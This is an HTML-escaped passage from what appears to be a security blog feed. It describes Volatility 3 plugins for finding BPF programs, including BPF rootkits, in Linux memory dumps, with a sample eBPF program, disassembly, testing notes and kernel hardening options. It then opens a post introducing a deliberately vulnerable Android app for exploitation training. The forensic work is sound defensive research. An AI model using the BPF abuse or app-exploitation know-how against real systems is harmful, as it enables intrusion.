&lt;span style="color:#66d9ef">int&lt;/span> my_pid &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
SEC(&lt;span style="color:#e6db74">&amp;#34;tp/syscalls/sys_enter_write&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">int&lt;/span> handle_tp(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ctx)
{
&lt;span style="color:#66d9ef">int&lt;/span> pid &lt;span style="color:#f92672">=&lt;/span> bpf_get_current_pid_tgid() &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (pid &lt;span style="color:#f92672">!=&lt;/span> my_pid)
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
bpf_printk(&lt;span style="color:#e6db74">&amp;#34;BPF triggered from PID %d.&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, pid);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The above source code is compiled with clang to produce an ELF relocatable object file. It contains the BPF bytecode along with additional information, like BTF sections, CORE relocations, programs as well as their attachment mechanisms and points, maps that are used and so on. This ELF is then embedded into a user space program that statically links against libbpf. At runtime, it passed the ELF to libbpf, which takes care of all the relocations and kernel interactions required to wire up the program to the BPF VM.&lt;/p>
&lt;p>With the above C code in the back of our heads, we can now have a look at the relevant component of live system’s BPF object graph. To limit the output of the plugin to the connected components that contain certain nodes, we can add the &lt;code>--components&lt;/code> flag to the invocation and give it a list of nodes (the format is &lt;code>&amp;lt;node_type&amp;gt;-&amp;lt;id&amp;gt;&lt;/code> where &lt;code>node_type&lt;/code> is in &lt;code>{map,link,prog,proc}&lt;/code> and &lt;code>id&lt;/code> is the BPF object ID or PID).&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2023/12/debian-bookworm-6.1.0-13-amd64_all_components_proc-695.png" alt="debian-bookworm-6.1.0-13-amd64_all_components_proc-695.png">&lt;/p>
&lt;p>As we can see, the ELF has caused libbpf to create a program, two maps and a link while loading. We can now use our plugins to gather more information about each object. Let&amp;rsquo;s start with the program itself.&lt;/p>
&lt;pre tabindex="0">&lt;code># vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listprogs --id 98 --dump-jited --dump-xlated
Volatility 3 Framework 2.5.0
Progress: 100.00 Stacking attempts finished
OFFSET (V) ID TYPE NAME TAG LOADED AT MAP IDs BTF ID HELPERS
0xbce500673000 98 TRACEPOINT handle_tp 6a5dcef153b1001e 1417821088492 40,45 196 bpf_get_current_pid_tgid,bpf_trace_printk
&lt;/code>&lt;/pre>&lt;p>By looking at the last column we can see that it is indeed using two kernel helper functions, where the apparent call to &lt;code>bpf_printk&lt;/code> turns out to be a macro that expands to &lt;code>bpf_trace_printk&lt;/code>. If we look at the program byte and the machine code side by side, we can discover a few things.&lt;/p>
&lt;pre tabindex="0">&lt;code># cat .prog_0xbce500673000_98_bdisasm
0x0: 85 00 00 00 10 b2 02 00 call 0x2b210
0x8: 77 00 00 00 20 00 00 00 rsh64 r0, 0x20
0x10: 18 01 00 00 00 a0 49 00 00 00 00 00 e5 bc ff ff lddw r1, 0xffffbce50049a000
0x20: 61 11 00 00 00 00 00 00 ldxw r1, [r1]
0x28: 5d 01 05 00 00 00 00 00 jne r1, r0, +0x5
0x30: 18 01 00 00 10 83 83 f5 00 00 00 00 7b 9b ff ff lddw r1, 0xffff9b7bf5838310
0x40: b7 02 00 00 1c 00 00 00 mov64 r2, 0x1c
0x48: bf 03 00 00 00 00 00 00 mov64 r3, r0
0x50: 85 00 00 00 80 0c ff ff call 0xffff0c80
0x58: b7 00 00 00 00 00 00 00 mov64 r0, 0x0
0x60: 95 00 00 00 00 00 00 00 exit
# cat .prog_0xbce500673000_98_mdisasm
handle_tp:
0xffffc03772a0: 0f 1f 44 00 00 nop dword ptr [rax + rax]
0xffffc03772a5: 66 90 nop
0xffffc03772a7: 55 push rbp
0xffffc03772a8: 48 89 e5 mov rbp, rsp
0xffffc03772ab: e8 d0 fc aa f1 call 0xffffb1e26f80 # bpf_get_current_pid_tgid
0xffffc03772b0: 48 c1 e8 20 shr rax, 0x20
0xffffc03772b4: 48 bf 00 a0 49 00 e5 bc ff ff movabs rdi, 0xffffbce50049a000 # minimal_.bss + 0x110
0xffffc03772be: 8b 7f 00 mov edi, dword ptr [rdi]
0xffffc03772c1: 48 39 c7 cmp rdi, rax
0xffffc03772c4: 75 17 jne 0xffffc03772dd # handle_tp + 0x3d
0xffffc03772c6: 48 bf 10 83 83 f5 7b 9b ff ff movabs rdi, 0xffff9b7bf5838310 # minimal_.rodata + 0x110
0xffffc03772d0: be 1c 00 00 00 mov esi, 0x1c
0xffffc03772d5: 48 89 c2 mov rdx, rax
0xffffc03772d8: e8 13 57 a7 f1 call 0xffffb1dec9f0 # bpf_trace_printk
0xffffc03772dd: 31 c0 xor eax, eax
0xffffc03772df: c9 leave
0xffffc03772e0: c3 ret
0xffffc03772e1: cc int3
&lt;/code>&lt;/pre>&lt;p>The first lesson here is probably that symbol annotations are useful :). As expected, when ignoring the prologue and epilogue inserted by the JIT-compiler, the translation between BPF and x86_64 is essentially one-to-one. Furthermore, uses of global C variables like &lt;code>my_pid&lt;/code> or the format string result in direct references to kernel memory, where the closest preceding symbols are the &lt;code>minimal_.bss&lt;/code>&amp;rsquo;s and &lt;code>minimal_.rodata&lt;/code>&amp;rsquo;s &lt;code>bpf_map&lt;/code> structures, respectively. For simple array maps, the &lt;code>bpf_map&lt;/code> structure resides at the beginning of a buffer that also holds the array data, &lt;code>0x110&lt;/code> is simply the offset at which the map&amp;rsquo;s payload data starts. More generally, libbpf will automatically create maps to hold the variables living in the &lt;code>.data&lt;/code>, &lt;code>.rodata&lt;/code>, and &lt;code>.bss&lt;/code> sections.&lt;/p>
&lt;p>Dumping the map contents confirms that the &lt;code>.bss&lt;/code> map holds the &lt;code>minimal&lt;/code> process&amp;rsquo;s PID while the &lt;code>.rodata&lt;/code> map contains the format string.&lt;/p>
&lt;pre tabindex="0">&lt;code># vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listmaps --id 45 40 --dump
Volatility 3 Framework 2.5.0
Progress: 100.00 Stacking attempts finished
OFFSET (V) ID TYPE NAME KEY SIZE VALUE SIZE MAX ENTRIES
0xbce500499ef0 40 ARRAY minimal_.bss 4 4 1
0x9b7bf5838200 45 ARRAY minimal_.rodata 4 28 1
# cat .map_0xbce500499ef0_40
{&amp;quot;0&amp;quot;: &amp;quot;section (.bss) = {\n (my_pid) (int) b'\\xb7\\x02\\x00\\x00'\n&amp;quot;}
# cat .map_0x9b7bf5838200_45
{&amp;quot;0&amp;quot;: &amp;quot;section (.rodata) = {\n (handle_tp.____fmt) b'BPF triggered from PID %d.\\n\\x00'\n&amp;quot;}
&lt;/code>&lt;/pre>&lt;p>In the source code we saw the directive &lt;code>SEC(&amp;quot;tp/syscalls/sys_enter_write&amp;quot;)&lt;/code>, which instructs the compiler to place the &lt;code>handle_tp&lt;/code> function&amp;rsquo;s BPF bytecode in an ELF section called &lt;code>&amp;quot;tp/syscalls/sys_enter_write&amp;quot;&lt;/code>. While loading, libbpf picks this up and creates a link that attaches the program to a perf event that is activated by the &lt;code>sys_enter_write&lt;/code> tracepoint. We can inspect the link, but getting more information about the corresponding trace point is not yet implemented. Contributions are always highly welcome :)&lt;/p>
&lt;pre tabindex="0">&lt;code># vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listlinks --id 11
Volatility 3 Framework 2.5.0
Progress: 100.00 Stacking attempts finished
OFFSET (V) ID TYPE PROG ATTACH
0x9b7bc2c09ae0 11 PERF_EVENT 98
&lt;/code>&lt;/pre>&lt;p>Dissecting the &amp;ldquo;Hello, World&amp;rdquo; programm was useful to get an impression of what a BPF application looks like at runtime. Before concluding this section, we will have a look at a less minimalist example, the process with PID 687.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2023/12/debian-bookworm-6.1.0-13-amd64_all_components_proc-687.png" alt="debian-bookworm-6.1.0-13-amd64_all_components_proc-687.png">&lt;/p>
&lt;p>This process is one of the kernel self-tests. It tests a BPF feature that allows to load new function pointer tables used for dynamic dispatch (so called structure operations), where the individual operations are implemented as BPF programs, at runtime. The programs that implement the new operations can be recognized by their type &lt;code>STRUCT_OPS&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code># vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listprogs --id 37 39 40 42 43 44 45
Volatility 3 Framework 2.5.0
Progress: 100.00 Stacking attempts finished
OFFSET (V) ID TYPE NAME TAG LOADED AT MAP IDs BTF ID HELPERS
0xbce5003b7000 37 STRUCT_OPS dctcp_init 562160e42a59841c 1417427431243 9,10,7 124 bpf_sk_storage_get,bpf_sk_storage_delete
0xbce50046b000 39 STRUCT_OPS dctcp_ssthresh cddbf7f9cf9b52d7 1417427590219 9 124
0xbce500473000 40 STRUCT_OPS dctcp_update_alpha 6e84698df8007e42 1417427647277 9 124
0xbce500487000 42 STRUCT_OPS dctcp_state dc878de7981c438b 1417427777414 9 124
0xbce500493000 43 STRUCT_OPS dctcp_cwnd_event 70cbe888b7ece66f 1417427888091 9 124 bpf_tcp_send_ack
0xbce5004e5000 44 STRUCT_OPS dctcp_cwnd_undo 78b977678332d89f 1417428066805 9 124
0xbce5004eb000 45 STRUCT_OPS dctcp_cong_avoid 20ff0d9ab24c8843 1417428109672 9 124 tcp_reno_cong_avoid
&lt;/code>&lt;/pre>&lt;p>The mapping between the programs and the function pointer table they implement is realized through a special map of type &lt;code>STRUCT_OPS&lt;/code> created by the process.&lt;/p>
&lt;pre tabindex="0">&lt;code># vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listmaps --id 11 12
Volatility 3 Framework 2.5.0
Progress: 100.00 Stacking attempts finished
OFFSET (V) ID TYPE NAME KEY SIZE VALUE SIZE MAX ENTRIES
0x9b7bc3c41000 11 STRUCT_OPS dctcp_nouse 4 256 1
0x9b7bc3c43400 12 STRUCT_OPS dctcp 4 256 1
&lt;/code>&lt;/pre>&lt;p>Unfortunately, the current implementation does not parse the contents of the map, so it cannot determine the name of the kernel structure being implemented and the mapping between its member functions and the BPF programs. As always, contributions are highly welcome :). In this case, we would find out that it implements &lt;a href="https://elixir.bootlin.com/linux/v6.1.65/source/include/net/tcp.h#L1071">&lt;code>tcp_congestion_ops&lt;/code>&lt;/a> to load a new TCP congestion control algorithm on the fly.&lt;/p>
&lt;p>There is a lot more to explore in this memory image, so feel free to have a closer look at the other processes. You might also want to check out the &lt;code>krie&lt;/code> example in &lt;a href="https://github.com/vobst/BPFVol3/blob/main/docs/examples/krie/krie.md">&lt;code>our documentation&lt;/code>&lt;/a> to get an impression of a larger BPF application.&lt;/p>
&lt;h2 id="testing">Testing&lt;/h2>
&lt;p>We tested the plugins on memory images acquired from virtual machines running on QEMU/KVM that were suspended for the duration of the acquisition process. To ensure the correctness of all plugin results, we have cross-checked them by debugging the guest kernel as well as comparing them with &lt;code>bpftool&lt;/code> running on the guest.&lt;/p>
&lt;p>Below is a list of the distributions and releases that we used for manual testing&lt;/p>
&lt;p>&lt;strong>Debian&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>12.2.0-14, Linux 6.1.0-13&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Ubuntu&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>22.04.2, Linux 5.15.0-89-generic&lt;/li>
&lt;li>20.04, Linux 5.4.0-26-generic&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Custom&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Linux 6.0.12, various configurations&lt;/li>
&lt;li>Linux 6.2.12, various configurations&lt;/li>
&lt;/ul>
&lt;p>For each of these kernels, we tested at least all the plugins on an image taken during the execution of the libbpf-bootstrap example programs.&lt;/p>
&lt;p>Additionally, to the above mentioned kernels we also developed an evaluation framework (the code is not public). The framework is based on &lt;a href="https://www.vagrantup.com/">Vagrant&lt;/a> and &lt;a href="https://libvirt.org/">libvirt&lt;/a>/&lt;a href="https://linux-kvm.org/page/Main_Page">KVM&lt;/a>. First we create and update all VMs. After that we run programs from &lt;code>libbpf-bootstrap&lt;/code> with &lt;code>nohup&lt;/code> so that we can leave the VM and dump the memory from outside. To dump the memory we use &lt;code>virsh&lt;/code> with &lt;code>virsh dump &amp;lt;name of VM&amp;gt; --memory-only&lt;/code>. &lt;code>virsh dump&lt;/code> pauses the VM for a clean acquisition of the main memory. We also install debug symbols for all the Linux distributions under investigation so that we can gather the debug kernels (&lt;code>vmlinux&lt;/code> with DWARF debugging information) and the &lt;code>System.map&lt;/code> file. We then use both files with &lt;a href="https://github.com/volatilityfoundation/dwarf2json">&lt;code>dwarf2json&lt;/code>&lt;/a> to generate the ISF information that Volatility 3 needs. Currently, we tested the following Linux distributions with their respective kernels:&lt;/p>
&lt;ul>
&lt;li>Alma Linux 9 - Linux kernel 5.14.0-362.8.1.el9_3.x86_64 ✅&lt;/li>
&lt;li>Fedora 38 - Linux kernel 6.6.6-100.fc38.x86_64 ✅&lt;/li>
&lt;li>Fedora 39 - Linux kernel 6.6.6-200.fc39.x86_64 ✅&lt;/li>
&lt;li>CentOS Stream 9 - Linux kernel 5.14.0-391.el9.x86_64 ✅&lt;/li>
&lt;li>Rocky Linux 8 - Linux kernel 4.18.0-513.9.1.el8_9.x86_64 ✅&lt;/li>
&lt;li>Rocky Linux 9 - 🪲 &lt;code>kernel-debuginfo-common&lt;/code> package is missing so the kernel debugging symbols cannot be installed (&lt;a href="https://download.rockylinux.org/pub/rocky/9/BaseOS/x86_64/debug/tree/Packages/k/">list of packages&lt;/a>)&lt;/li>
&lt;li>Debian 11 - Linux kernel 5.10.0-26-amd64 ✅&lt;/li>
&lt;li>Debian 12 - Linux kernel 6.1.0-13-amd64 ✅&lt;/li>
&lt;li>Ubuntu 22.04 - Linux kernel 5.15.0-88-generic ✅&lt;/li>
&lt;li>Ubuntu 23.10 - Linux kernel 6.5.0-10-generic ✅ (works partially, but process listing is broken due to this &lt;a href="https://github.com/volatilityfoundation/dwarf2json/issues/57">dwarf2json GitHub Issue&lt;/a>)&lt;/li>
&lt;li>ArchLinux - Linux kernel 6.6.7-arch1-1 ✅ (works partially, but breaks probably due to the same issue as &lt;a href="https://github.com/volatilityfoundation/volatility3/issues/1065">volatility3/dwarf2json GitHub Issue&lt;/a>)&lt;/li>
&lt;li>openSUSE Tumbleweed - ❓ it seems that the debug kernel that is provided by OpenSUSE &lt;em>does&lt;/em> contain debugging symbols but other sections such as &lt;code>.rodata&lt;/code> are removed (zeroed out) so that &lt;code>dwarf2json&lt;/code> is not able to find the banner (further analyses cannot be carried out without this information) - we will further investigate this issue&lt;/li>
&lt;/ul>
&lt;p>We will check if the problems get resolved and re-evaluate our plugin. Generally, our framework is designed to support more distributions as well and we will try to evaluate the plugin on a wider variety of them.&lt;/p>
&lt;p>During our automated analysis we encountered an interesting problem. To collect the kernels with debugging symbols from the VMs we need to copy them to the host. When copying the kernel executable file it will be read into main memory by the kernel&amp;rsquo;s page-cache mechanism. This implies that parts of the kernel file (vmlinux) and the kernel itself (the running kernel not the file) may be present in the dump. This can lead to the problem of the Volatility 3 function &lt;code>find_aslr&lt;/code> (&lt;a href="https://github.com/volatilityfoundation/volatility3/blob/fdf93f502fa8d0edc2b60764463aee3c455aeb03/volatility3/framework/automagic/linux.py#L121">source code&lt;/a>) first finding matches in the page-cached kernel file (vmlinux) and not in the running kernel. An issue has been opened &lt;a href="https://github.com/volatilityfoundation/volatility3/pull/1070">here&lt;/a>.&lt;/p>
&lt;h2 id="related-work">Related Work&lt;/h2>
&lt;p>There are several articles on BPF that cover different security-related aspects of the subsystem. In this section, we will briefly discuss the ones that are most relevant to the presented work.&lt;/p>
&lt;p>&lt;strong>Memory Forensics&lt;/strong>: The &lt;a href="https://github.com/crash-utility/crash/tree/master">&lt;code>crash&lt;/code>&lt;/a> utility, which is used to analyze live systems or kernel core dumps, has a &lt;a href="https://github.com/crash-utility/crash/blob/master/bpf.c">&lt;code>bpf&lt;/code> subcommand&lt;/a> that can be used to display information about BPF maps and programs. However, as it is not a forensics tool it relies solely on the information obtained via the &lt;code>prog_idr&lt;/code> and &lt;code>map_ird&lt;/code>. Similarly, the &lt;a href="https://github.com/osandov/drgn">&lt;code>drgn&lt;/code>&lt;/a> programmable debugger comes with a &lt;a href="https://github.com/osandov/drgn/blob/main/tools/bpf_inspect.py">script&lt;/a> to list BPF programs and maps but suffers from the same problems when it comes to anti-forensic techniques. Furthermore, &lt;code>drgn&lt;/code> and &lt;code>crash&lt;/code> are primarily known as debugging tools for systems developers and as such not necessarily well-established in the digital forensics and incidence response (DFIR) community. In contrast, we implemented our analyses as plugins for the popular Volatility framework well-known in the DFIR community. Finally, A. Case and G. Richard presented Volatility plugins for investigating the Linux tracing infrastructure in their &lt;a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Fixing-A-Memory-Forensics-Blind-Spot-Linux-Kernel-Tracing-wp.pdf">BlackHat US 2021 paper&lt;/a>. Apart from a plugin that lists programs by parsing the &lt;code>prog_idr&lt;/code>, they have also implemented several plugins that can find BPF programs by analyzing the data structures of the attachment mechanisms they use, such as kprobes, tracepoints or perf events. Thus, their plugins are also able to discover inconsistencies that could reveal anti-forensic tampering. However, they have never publicly released their plugins and despite several attempts we have been unable to contact the authors to obtain a copy of the source code. Volatility already supports detecting BPF programs attached to sockets in its &lt;a href="https://github.com/volatilityfoundation/volatility3/blame/develop/volatility3/framework/plugins/linux/sockstat.py#L163">&lt;code>sockstat&lt;/code>&lt;/a> plugin. The displayed information is limited to names and IDs.&lt;/p>
&lt;p>&lt;strong>Reverse Engineering&lt;/strong>: Reverse engineering BPF programs is a key step while triaging the findings of our plugins. Recently, the &lt;a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra&lt;/a> software reverse engineering (SRE) suite gained &lt;a href="https://github.com/NationalSecurityAgency/ghidra/pull/4258">support for the BPF architecture&lt;/a>, which means that its powerful decompiler can be used to analyze BPF bytecode extracted from kernel memory or user-space programs. Furthermore, BPF bytecode is oftentimes embedded into user-space programs that use framework libraries to load it into the kernel at runtime. For programs written in the Go programming language, &lt;a href="https://github.com/Gui774ume/ebpfkit-monitor">ebpfkit-monitor&lt;/a> can parse the binary format of these embedded files to list the defined programs and maps as well as their interactions. It uses this information to generate graphs that are similar to those of our &lt;code>bpf_graph&lt;/code> plugin. Although the utility of these graphs has inspired our plugin, it is fundamentally different in that it displays information about the state of the kernel&amp;rsquo;s BPF subsystem extracted from a memory image. Consequently, it is inherently agnostic to the user-space framework that was used for compiling and loading the programs. Additionally, it displays the actual state of the BPF subsystem instead of the BPF objects that might be created by an executable at runtime.&lt;/p>
&lt;p>&lt;strong>Runtime Protection and Monitoring&lt;/strong>: Important aspects of countering BPF malware are preventing attackers from loading malicious BPF programs and logging suspicious events for later review. &lt;a href="https://github.com/Gui774ume/krie">krie&lt;/a> and &lt;a href="https://github.com/Gui774ume/ebpfkit-monitor">ebpfkit-monitor&lt;/a> are tools that can be used to log BPF-related events as well as to deny processes access to the BPF system call.&lt;/p>
&lt;p>Simply blocking access on a per-process basis is too course-grained for many applications and thus &lt;a href="https://medium.com/@yunwei356/the-secure-path-forward-for-ebpf-runtime-challenges-and-innovations-968f9d71fc16">multiple approaches were proposed&lt;/a> to implement a more fine-grained access control model for the BPF subsystem to facilitate the realization of least privilege policies. Among those, one can further distinguish between proposals that implement access control in user space, kernel space, or a hypervisor.&lt;/p>
&lt;p>&lt;a href="https://bpfman.io/main/">&lt;code>bpfman&lt;/code>&lt;/a> (formerly known as bpfd) is a privileged user space daemon that acts as proxy for loading BPF programs and can be used to implement different access control policies. A combination of a privileged user-space daemon and kernel changes is used in the proposed &lt;a href="https://lwn.net/Articles/947173/">BPF token approach&lt;/a> that allows delegation of access to specific parts of the BPF subsystem to container processes by a privileged daemon.&lt;/p>
&lt;p>A fine-grained in-kernel access control is offered by the &lt;a href="https://dl.acm.org/doi/abs/10.5555/3620237.3620571">CapBits&lt;/a> proposed by Yi He et al. Here, two bitfields are added to the &lt;code>task_struct&lt;/code>, where one defines the access that a process has to the BPF subsystem, e.g., allowed program types and helpers, and the other restricts the access that BPF programs can have on the process, e.g., to prevent it from being traced by kprobe programs. Namespaces are already used in many areas of the Linux kernel to virtualize global resources like PIDs or network devices. Thus, Y. &lt;a href="https://lwn.net/Articles/927354/">Shao proposed introducing BPF namespaces&lt;/a> to limit the scope of loaded programs to processes inside of the namespace. Finally, &lt;a href="https://www.youtube.com/watch?v=9p4qviq60z8">signatures over programs&lt;/a> are a mechanism that allows the kernel to verify their provenance, which can be used analogous to module signatures that prevent attackers from loading malicious kernel modules.&lt;/p>
&lt;p>Lastly, Y. Wang et al. &lt;a href="https://dl.acm.org/doi/10.1145/3609021.3609305">proposed&lt;/a> moving large parts of the BPF VM from the kernel into a hypervisor, where they implement a multi-step verification process that includes enforcing a security policy, checking signatures, and scanning for known malicious programs. In the security policy, allowed programs can be specified as a set of deterministic finite automata, which allows for accepting dynamically generated programs without allowing for arbitrary code to be loaded.&lt;/p>
&lt;p>All these approaches are complementary to our plugins as they focus on reducing the chance that an attacker can successfully load a malicious program, while we assume that this step has already happened and aim to detect their presence.&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>In this post, we gave an introduction to the Linux BPF subsystem and discussed its potential for abuse. We then presented seven Volatility plugins that allow investigators to detect BPF malware in memory images and evaluated them on multiple versions of popular Linux distributions. To conclude the post, we will briefly discuss related projects we are working on and plans for future work.&lt;/p>
&lt;p>This project grew out of the preparation of a &lt;a href="https://web.archive.org/web/20230323233100/https://dfrws.org/forensic-analysis-of-ebpf-based-linux-rootkits/">workshop&lt;/a> on BPF rootkits at the DFRWS EU 2023 annual conference (&lt;a href="https://github.com/fkie-cad/bpf-rootkit-workshop">materials&lt;/a>). We began working on this topic because we believe that the forensic community needs to expand its toolbox in response to the rise of BPF in the Linux world to fill blind spots in existing analysis methods. Additionally, investigators who may encounter BPF in their work should be made aware of the potential relevance of the subsystem to their investigation.&lt;/p>
&lt;p>While the workshop, our plugins, and this post are an important step towards this goal, much work remains to be done. First, in order for the present work to be useful in the real world our next goal must be to upstream most of it into the Volatility 3 project. Only this will ensure that investigators all around the world will be able to easily find and use it. This will require:&lt;/p>
&lt;ul>
&lt;li>Refactoring of our utility code to use Volatility 3&amp;rsquo;s extension class mechanism&lt;/li>
&lt;li>The &lt;code>bpf_graph&lt;/code> plugin relies on &lt;a href="https://networkx.org/documentation/stable/reference/algorithms/index.html">networkx&lt;/a>, which is not yet a dependency of Volatility 3. If the introduction of a new dependency into the upstream project is not feasible, one could make it optional by checking for the presence of the package within the plugin.&lt;/li>
&lt;li>Additional testing on older kernel versions and kernels with diverse configurations to meet Volatility&amp;rsquo;s high standards regarding compatibility&lt;/li>
&lt;/ul>
&lt;p>We will be happy to work with upstream developers to make the integration happen.&lt;/p>
&lt;p>Furthermore, there remains the problem of dealing with the wide variety of map types when extracting their contents, as well as the related problem of pretty-printing them using BTF information. Here, we consider a manual implementation approach to be impractical and would explore the possibility of using emulation of the relevant functions.&lt;/p>
&lt;p>Regarding the advanced analysis aimed at countering anti-forensics, we have also implemented consistency checks against the lists of kprobes and tracepoints, but these require further work to be ready for publication. We also described additional analyses in our workshop that still need to be implemented.&lt;/p>
&lt;p>Finally, an interesting side effect of the introduction of BPF into the Linux kernel is that most of the functionality requires BTF information for the kernel and modules to be available. This provides an easy solution to the problem of obtaining type information from a raw memory image, a step that is central to automatic profile generation. We have already shown that it is possible to reliably extract BTF sections from memory images by implementing a &lt;a href="https://github.com/vobst/BPFVol3/blob/extractbtf/src/plugins/btf_extract.py">plugin&lt;/a> for that. We have also explored the possibility of combining this with existing approaches for extracting symbol information in order to obtain working profiles from a dump. While the results are promising, further work is needed to have a usable solution.&lt;/p>
&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;h3 id="a-kernel-configuration">A: Kernel Configuration&lt;/h3>
&lt;p>This section provides a list of compile-time kernel configuration options that can be adjusted to restrict the capabilities of BPF programs. In general, it is recommended to disable unused features in order to reduce the attack surface of a system.&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/kernel/bpf/Kconfig#L26">&lt;code>BPF_SYSCALL=n&lt;/code>&lt;/a>: Disables the BPF system call. Probably breaks most systemd-based systems.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/lib/Kconfig.debug#L345">&lt;code>DEBUG_INFO_BTF=n&lt;/code>&lt;/a>: Disables generation of BTF debug information, i.e., CORE no longer works on this system. Forces attackers to compile on/for the system they want to compromise.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/kernel/bpf/Kconfig#L90">&lt;code>BPF_LSM=n&lt;/code>&lt;/a>: BPF programs cannot be attached to LSM hooks.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.67/source/security/lockdown/Kconfig#L33">&lt;code>LOCK_DOWN_KERNEL_FORCE_INTEGRITY=y&lt;/code>&lt;/a>: Prohibits the use of &lt;code>bpf_probe_write_user&lt;/code>.&lt;/li>
&lt;li>&lt;a href="https://www.kernelconfig.io/CONFIG_NET_CLS_BPF?q=NET_CLS_BPF&amp;amp;kernelversion=6.6.6&amp;amp;arch=x86">&lt;code>NET_CLS_BPF=n&lt;/code>&lt;/a> and &lt;a href="https://www.kernelconfig.io/CONFIG_NET_ACT_BPF?q=CONFIG_NET_ACT_BPF&amp;amp;kernelversion=6.6.6&amp;amp;arch=x86">&lt;code>NET_ACT_BPF=n&lt;/code>&lt;/a>: BPF programs cannot be used in TC classifier actions. Stops some data exfiltration techniques.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.67/source/lib/Kconfig.debug#L1880">&lt;code>FUNCTION_ERROR_INJECTION=n&lt;/code>&lt;/a>: Disables the function error injection framework, i.e., BPF programs can no longer use &lt;code>bpf_override_return&lt;/code>.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/net/netfilter/Kconfig#L1168">&lt;code>NETFILTER_XT_MATCH_BPF=n&lt;/code>&lt;/a>: Disables option to use &lt;a href="https://blog.cloudflare.com/programmable-packet-filtering-with-magic-firewall/">BPF programs in nftables rules&lt;/a>. Could be used to implement malicious firewall rules.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/kernel/trace/Kconfig#L696">&lt;code>BPF_EVENTS=n&lt;/code>&lt;/a>: Removes the option to attach BPF programs to kprobes, uprobes, and tracepoints.&lt;/li>
&lt;/ul>
&lt;p>Below are options that limit features that we consider less likely to be used by malware.&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/net/bpfilter/Kconfig#L2">&lt;code>BPFILTER=n&lt;/code>&lt;/a>: This is an unfinished BPF-based replacement of iptables/nftables (currently not functional).&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/net/Kconfig#L397">&lt;code>LWTUNNEL_BPF=n&lt;/code>&lt;/a>: Disables the use of BPF programs for routing decisions in light weight tunnels.&lt;/li>
&lt;li>&lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/init/Kconfig#L1157">&lt;code>CGROUP_BPF=n&lt;/code>&lt;/a>: Disables the option to attach BPF programs to cgoups. Cgroup programs can monitor various networking-related events of processes in the group. Probably breaks most systemd-based systems.&lt;/li>
&lt;/ul></content></item><item><title>Diving into the art of userspace exploitation under Android - Introducing E²VA (Part 1)</title><link>https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/</link><pubDate>Mon, 21 Nov 2022 18:54:42 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/11/diving_into_the_art_of_userspace_exploitation_under_android/</guid><description>Investigating Binary Exploitation for JNI on Android This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the damnvulnerableapp supports the process of binary exploitation on Android.
Warning The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app.</description><content>&lt;h1 id="investigating-binary-exploitation-for-jni-on-android">Investigating Binary Exploitation for JNI on Android&lt;/h1>
&lt;p>This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the &lt;em>damnvulnerableapp&lt;/em> supports the process of binary exploitation on Android.&lt;/p>
&lt;h2 id="warning">Warning&lt;/h2>
&lt;p>The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app. Therefore, beware of this and do not use this app on a device/emulator that contains personal information whatsoever. Always launch the app in a controlled environment. &lt;strong>No authentication&lt;/strong> is necessary to connect to the app and talk to vulnerable modules. Assuming the app is free of bugs, there is a guarantee that only one client can connect at a time.&lt;/p>
&lt;h2 id="esup2supva-the-damnvulnerableapp">&lt;em>E&lt;!-- raw HTML omitted -->2&lt;!-- raw HTML omitted -->VA&lt;/em>, the &lt;em>damnvulnerableapp&lt;/em>&lt;/h2>
